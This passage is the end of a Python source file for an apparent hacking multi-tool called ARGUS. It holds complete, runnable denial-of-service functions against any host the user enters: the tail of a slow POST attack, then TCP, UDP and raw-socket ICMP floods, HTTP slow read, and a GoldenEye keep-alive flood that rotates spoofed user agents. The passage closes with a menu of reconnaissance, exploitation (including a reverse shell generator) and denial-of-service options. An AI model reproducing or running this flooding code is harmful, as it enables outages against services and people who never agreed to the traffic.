                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (ARGUS RUDY)\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {fake_len}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                counter[0] += 1

                # Send body one byte at a time
                while not stop_event.is_set():
                    byte = random.choice(string.ascii_lowercase).encode()
                    s.send(byte)
                    counter[0] += 1
                    time.sleep(random.uniform(5, 15))
            except Exception:
                pass
            finally:
                try:
                    s.close()
                except Exception:
                    pass

    stats_thread = threading.Thread(target=_stress_stats, args=("SLOW POST", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(conns):
        t = threading.Thread(target=rudy_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Bytes Sent", str(counter[0]))
    print_row("Connections Used", str(conns))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 44. TCP Connection Flood ─────────────────────────────────────────────────

def tcp_flood():
    print_header("TCP Connection Flood")
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    port_s = input(f"  {Y}Target port [80]:{RST} ").strip() or "80"
    threads = input(f"  {Y}Threads (1-200) [100]:{RST} ").strip() or "100"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        port = int(port_s)
        threads = min(200, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print_err("Could not resolve hostname")
        return

    print_row("Target", f"{ip}:{port}")
    print_row("Threads", str(threads))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]
    errors = [0]
    start_time = time.time()

    def tcp_worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                # Send random data
                data = bytes(random.getrandbits(8) for _ in range(random.randint(64, 1024)))
                s.send(data)
                counter[0] += 1
                s.close()
            except Exception:
                errors[0] += 1

    stats_thread = threading.Thread(target=_stress_stats, args=("TCP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=tcp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Connections", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} conn/s" if elapsed > 0 else "N/A")


# ─── 45. UDP Flood ────────────────────────────────────────────────────────────

def udp_flood():
    print_header("UDP Flood")
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    port_s = input(f"  {Y}Target port [53]:{RST} ").strip() or "53"
    threads = input(f"  {Y}Threads (1-100) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
    pkt_size = input(f"  {Y}Packet size in bytes (1-65507) [1024]:{RST} ").strip() or "1024"

    try:
        port = int(port_s)
        threads = min(100, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
        pkt_size = min(65507, max(1, int(pkt_size)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print_err("Could not resolve hostname")
        return

    print_row("Target", f"{ip}:{port}")
    print_row("Threads", str(threads))
    print_row("Packet Size", f"{pkt_size} bytes")
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]
    bytes_sent = [0]
    start_time = time.time()

    def udp_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = bytes(random.getrandbits(8) for _ in range(pkt_size))
        while not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                counter[0] += 1
                bytes_sent[0] += pkt_size
            except Exception:
                pass
        sock.close()

    stats_thread = threading.Thread(target=_stress_stats, args=("UDP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=udp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    mb = bytes_sent[0] / (1024 * 1024)
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Packets", str(counter[0]))
    print_row("Data Sent", f"{mb:.1f} MB")
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} pkt/s" if elapsed > 0 else "N/A")
    print_row("Throughput", f"{mb/elapsed:.1f} MB/s" if elapsed > 0 else "N/A")


# ─── 46. ICMP Ping Flood ─────────────────────────────────────────────────────

def icmp_flood():
    print_header("ICMP Ping Flood")
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    threads = input(f"  {Y}Threads (1-50) [10]:{RST} ").strip() or "10"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
    pkt_size = input(f"  {Y}Payload size in bytes (1-65500) [1024]:{RST} ").strip() or "1024"

    try:
        threads = min(50, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
        pkt_size = min(65500, max(1, int(pkt_size)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print_err("Could not resolve hostname")
        return

    print_row("Target", ip)
    print_row("Threads", str(threads))
    print_row("Payload Size", f"{pkt_size} bytes")
    print_row("Duration", f"{duration}s")
    print_warn("Requires root/sudo for raw sockets")
    print_warn("Press Ctrl+C to stop early\n")

    def _checksum(data):
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i]) + ((data[i + 1]) << 8)
        if n:
            s += data[-1]
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s

    def build_icmp_packet(payload_size):
        icmp_type = 8  # Echo request
        icmp_code = 0
        checksum = 0
        identifier = random.randint(0, 65535)
        sequence = random.randint(0, 65535)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
        checksum = _checksum(header + payload)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
        return header + payload

    stop_event = threading.Event()
    counter = [0]
    errors = [0]
    start_time = time.time()

    def icmp_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            errors[0] += 1
            return

        while not stop_event.is_set():
            try:
                packet = build_icmp_packet(pkt_size)
                sock.sendto(packet, (ip, 0))
                counter[0] += 1
            except Exception:
                errors[0] += 1
        sock.close()

    stats_thread = threading.Thread(target=_stress_stats, args=("ICMP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=icmp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    if errors[0] > 0 and counter[0] == 0:
        print_err("Failed — raw sockets require root/sudo privileges")
        return

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Packets", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} pkt/s" if elapsed > 0 else "N/A")


# ─── 47. HTTP Slow Read ──────────────────────────────────────────────────────

def http_slow_read():
    print_header("HTTP Slow Read")
    if not stress_disclaimer():
        return

    url = prompt("Target URL (preferably a large page/file)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    conns = input(f"  {Y}Connections (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"
    read_rate = input(f"  {Y}Read rate bytes/sec (1-100) [1]:{RST} ").strip() or "1"

    try:
        conns = min(200, max(1, int(conns)))
        duration = min(300, max(1, int(duration)))
        read_rate = min(100, max(1, int(read_rate)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port_s = host.rsplit(":", 1)
        port = int(port_s)

    print_row("Target", url)
    print_row("Connections", str(conns))
    print_row("Read Rate", f"{read_rate} byte(s)/sec")
    print_row("Duration", f"{duration}s")
    print_warn("Ties up server connections by reading responses extremely slowly")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]  # bytes read
    active = [0]
    start_time = time.time()

    def slow_reader():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                if use_ssl:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                active[0] += 1

                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (ARGUS SlowRead)\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(request.encode())

                # Read response extremely slowly
                s.settimeout(30)
                while not stop_event.is_set():
                    data = s.recv(read_rate)
                    if not data:
                        break
                    counter[0] += len(data)
                    time.sleep(1)

                active[0] -= 1
                s.close()
            except Exception:
                active[0] = max(0, active[0] - 1)

    stats_thread = threading.Thread(target=_stress_stats, args=("SLOW READ", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(conns):
        t = threading.Thread(target=slow_reader)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Bytes Read", str(counter[0]))
    print_row("Connections Used", str(conns))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 48. GoldenEye (HTTP Keep-Alive DoS) ─────────────────────────────────────

def goldeneye():
    print_header("GoldenEye (HTTP Keep-Alive Flood)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    workers_n = input(f"  {Y}Workers (1-200) [50]:{RST} ").strip() or "50"
    sockets_per = input(f"  {Y}Sockets per worker (1-50) [10]:{RST} ").strip() or "10"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        workers_n = min(200, max(1, int(workers_n)))
        sockets_per = min(50, max(1, int(sockets_per)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port_s = host.rsplit(":", 1)
        port = int(port_s)

    print_row("Target", url)
    print_row("Workers", str(workers_n))
    print_row("Sockets/Worker", str(sockets_per))
    print_row("Total Sockets", str(workers_n * sockets_per))
    print_row("Duration", f"{duration}s")
    print_warn("Uses Keep-Alive connections with randomized headers")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    ]

    referers = [
        "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
        "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    ]

    def goldeneye_worker():
        sockets = []
        while not stop_event.is_set():
            # Fill up sockets
            while len(sockets) < sockets_per and not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if use_ssl:
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    sockets.append(s)
                except Exception:
                    break

            # Send randomized requests on keep-alive connections
            for s in list(sockets):
                try:
                    rand_path = path + ("&" if "?" in path else "?") + \
                        f"{''.join(random.choices(string.ascii_lowercase, k=6))}={random.randint(1,99999)}"
                    request = (
                        f"GET {rand_path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: text/html,application/xhtml+xml,*/*;q=0.{random.randint(1,9)}\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                        f"Referer: {random.choice(referers)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Keep-Alive: timeout={random.randint(30,120)}\r\n\r\n"
                    )
                    s.send(request.encode())
                    counter[0] += 1
                except Exception:
                    sockets.remove(s)
                    try:
                        s.close()
                    except Exception:
                        pass

            time.sleep(random.uniform(0.05, 0.2))

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    stats_thread = threading.Thread(target=_stress_stats, args=("GOLDENEYE", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(workers_n):
        t = threading.Thread(target=goldeneye_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1.5)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Requests", str(counter[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} req/s" if elapsed > 0 else "N/A")


# ─── Menu System ───────────────────────────────────────────────────────────────

RECON_ITEMS = [
    ("Username Search", username_search),
    ("Email Lookup", email_lookup),
    ("Phone Number Lookup", phone_lookup),
    ("IP Address Lookup", ip_lookup),
    ("WHOIS Lookup", whois_lookup),
    ("DNS Lookup", dns_lookup),
    ("Subdomain Enumeration", subdomain_enum),
    ("HTTP Headers Analysis", http_headers),
    ("Website Technology Detection", tech_detect),
    ("Port Scanner", port_scanner),
    ("Reverse DNS Lookup", reverse_dns),
    ("MAC Address Lookup", mac_lookup),
    ("Email Breach Check", email_breach_check),
    ("Metadata Extractor", metadata_extractor),
    ("Social Media Scraper", social_scraper),
    ("SSL/TLS Certificate Info", ssl_cert_info),
    ("Wayback Machine Lookup", wayback_lookup),
    ("Robots.txt & Sitemap Analyzer", robots_sitemap),
    ("Link Extractor", link_extractor),
    ("Google Dorks Generator", google_dorks),
    ("Traceroute", traceroute),
    ("Hash Identifier & Lookup", hash_lookup),
    ("ASN Lookup", asn_lookup),
    ("Website Screenshot", website_screenshot),
    ("Reverse Image Search", reverse_image_search),
    ("CVE Search", cve_search),
    ("Paste / Code Search", paste_search),
    ("DNS Zone Transfer Check", dns_zone_transfer),
    ("SSL/TLS Suite Scanner", ssl_scanner),
    ("Shodan Host Lookup", shodan_lookup),
]

EXPLOIT_ITEMS = [
    ("SQL Injection Tester", sqli_tester),
    ("XSS Scanner (Reflected)", xss_scanner),
    ("Directory / File Bruteforcer", dir_bruteforce),
    ("CORS Misconfiguration Scanner", cors_check),
    ("Open Redirect Scanner", open_redirect_scanner),
    ("LFI / Path Traversal Tester", lfi_tester),
    ("Subdomain Takeover Check", subdomain_takeover),
    ("Reverse Shell Generator", revshell_generator),
    ("CMS Vulnerability Scanner", cms_vuln_scanner),
    ("Payload Encoder / Decoder", payload_encoder),
]

STRESS_ITEMS = [
    ("HTTP Flood (GET/POST)", http_flood),
    ("Slowloris", slowloris),
    ("Slow POST (R.U.D.Y.)", slow_post),
    ("TCP Connection Flood", tcp_flood),
    ("UDP Flood", udp_flood),
    ("ICMP Ping Flood", icmp_flood),
    ("HTTP Slow Read", http_slow_read),
    ("GoldenEye (Keep-Alive Flood)", goldeneye),
]

MENU_ITEMS = RECON_ITEMS + EXPLOIT_ITEMS + STRESS_ITEMS


def show_menu():
    w = 54
    print(f"\n  {Y}╔{'═' * w}╗{RST}")
    print(f"  {Y}║{W}{'MAIN MENU':^{w}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    print(f"  {Y}║{C}{'── OSINT / RECONNAISSANCE ──':^{w}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    for i, (name, _) in enumerate(RECON_ITEMS, 1):
        num = f"{i:>2}"
        print(f"  {Y}║{RST}  {C}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    print(f"  {Y}║{R}{'── EXPLOITATION ──':^{w}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    exploit_start = len(RECON_ITEMS) + 1
    for i, (name, _) in enumerate(EXPLOIT_ITEMS, exploit_start):
        num = f"{i:>2}"
        print(f"  {Y}║{RST}  {R}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    print(f"  {Y}║{R}{'── STRESS / DENIAL OF SERVICE ──':^{w}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    stress_start = len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + 1
    for i, (name, _) in enumerate(STRESS_ITEMS, stress_start):
        num = f"{i:>2}"
        print(f"  {Y}║{RST}  {R}{num}.{RST} {W}{name:<{w-6}}{Y}║{RST}")
    print(f"  {Y}╠{'═' * w}╣{RST}")
    print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w-6}}{Y}║{RST}")
    print(f"  {Y}╚{'═' * w}╝{RST}")


def main():
    print(BANNER)

    while True:
        show_menu()
        choice = input(f"\n  {Y}Select option >{RST} ").strip()

        if choice == "0":
            print(f"\n  {R}Goodbye.{RST}\n")
            break

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(MENU_ITEMS):
                name, func = MENU_ITEMS[idx]
                try:
                    func()
                except KeyboardInterrupt:
                    print(f"\n  {Y}Interrupted.{RST}")
                pause()
            else:
                print_err("Invalid option")
        except ValueError:
            print_err("Enter a number")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {R}Interrupted. Goodbye.{RST}\n")
        sys.exit(0)
